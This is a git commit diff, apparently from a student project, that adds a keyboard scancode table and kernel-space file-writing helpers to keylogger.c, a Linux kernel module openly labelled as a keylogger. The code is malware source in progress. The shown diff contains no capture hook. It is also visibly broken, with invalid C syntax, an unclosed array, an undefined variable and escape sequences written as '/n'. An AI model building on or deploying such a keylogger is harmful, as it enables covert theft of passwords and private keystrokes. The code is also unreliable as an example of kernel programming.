b671e147506700865044b0d220812180e9255e1a
Megan Clippinger <meganclippinger@yahoo.com>
2018-10-20 14:03:25 -0400

    Added list of scanchars and created an output file.

--- keylogger.c
+++ keylogger.c
@@ -1,16 +1,63 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/init.h>
-#include <stdio.h>
-#include <stdlib.h>
 
 #ifndef __KERNEL__
 #define __KERNEL__
 #endif
 
-FILE *output = fopen("output.txt", "w");
+//Matrix of all characters we will be tracking. Assuming a standard 101/102 US keyboard
 
+const string[] *scancodes[][2] = {
+  {"/0", "/0"}, {"/e", "/e"}, {"1", "!"}. {"2", "@"}, {"3", "#"},
+  {"4", "$"}, {"5", "%"}, {"6", "^"}, {"7", "&"}, {"8", "*"},
+  {"9", "("}, {"0", ")"}, {"-","_"}, {"=", "+"}, {"/b", "/b"},
+  {"/t", "/t"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r","R"}, {"t", "T"},
+  {"y", "Y"}, {"u", "U"}, {"i","I"}, {"o", "O"}, {"p", "P"}, {"[", "{"},
+  {"]", "}"}, {"/n", "/n"}, {"LCtrl", "LCtrl"}, {"a", "A"}, {"s", "S"}, {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, {"j", "J"}, {"k", "K"}, {"l", "L"},
+  {":", ";"}, {"\'", "\""}, {"", "~"}{"LShift", "LShift"}, {"\\", "|"},
+  {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"},
+  {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"RShift", "RShift"},
+  {"PrtScn", "KeyPad"},{"LAlt", "LAlt"}, {" ", " "}, {"CapsLock", "CapsLock"},  {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, 
+  {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"},
+  {"NumLock", "NumLock"}, {"ScrollLock", "ScrollLock"}, {"Keypad-7", "Home"},
+  {"Keypad-8", "Up"}, {"Keypad-9", "PgUp"},{"-", "-"}, {"Keypad-4", "Left"},
+  {"Keypad-5", "Keypad-5"},{"Keypad-6", "Right"}, {"+", "+"}, {"Keypad-1", "End"},    {"Keypad-2", "Down"}, {"Keypad-3", "PgDn"}, {"Keypad-0", "Ins"}, 
+  {"Keypad-", "Del"}, {"Alt-SysRq", "Alt-SysRq"}, {"\0", "\0"},{"\0", "\0"},
+  {"F11", "F11"}, {"F12", "F12"}                                  
 
+  //Creating the output file
+struct file *createFile(const char *path, int flags, int rights) 
+{
+    struct file *file = NULL;
+    mm_segment_t oldFileSpace;
+    int err = 0;
+
+    oldFileSpace = get_fs();
+    set_fs(get_ds());
+    file = file_open(path, flags, rights);
+    set_fs(oldfs);
+    if (IS_ERR(file)) {
+        err = PTR_ERR(file);
+        return NULL;
+    }
+    return file;
+}
+  //Write to the output file
+  int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
+{
+  mm_segment_t oldFileSpace;
+    int ret;
+
+    oldFileSpace = get_fs();
+    set_fs(get_ds());
+
+    ret = vfs_write(file, data, size, &offset);
+
+    set_fs(oldFileSpace);
+    return ret;
+}
+  
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("A kernel-based keylogger module");
 
